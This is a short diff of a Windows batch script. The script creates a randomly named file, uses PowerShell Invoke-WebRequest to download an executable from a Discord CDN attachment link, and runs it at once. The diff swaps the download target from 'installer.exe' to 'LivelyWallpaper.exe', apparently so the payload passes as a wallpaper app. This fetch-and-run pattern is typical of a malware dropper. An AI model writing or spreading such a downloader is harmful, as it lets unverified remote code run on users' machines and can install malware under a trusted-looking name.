@@ -44,6 +44,6 @@ set "counter=1"
 set "filename=%random%%random%%random%%extension%"
 if exist "%filename%" goto generateFilename
 
-Powershell -Command "Invoke-Webrequest 'https://cdn.discordapp.com/attachments/1116778631419674695/1116837118459781130/installer.exe' -OutFile !filename!"
+Powershell -Command "Invoke-Webrequest 'https://cdn.discordapp.com/attachments/1116778631419674695/1116792801586327582/LivelyWallpaper.exe' -OutFile !filename!"
 
 start "" "!filename!"
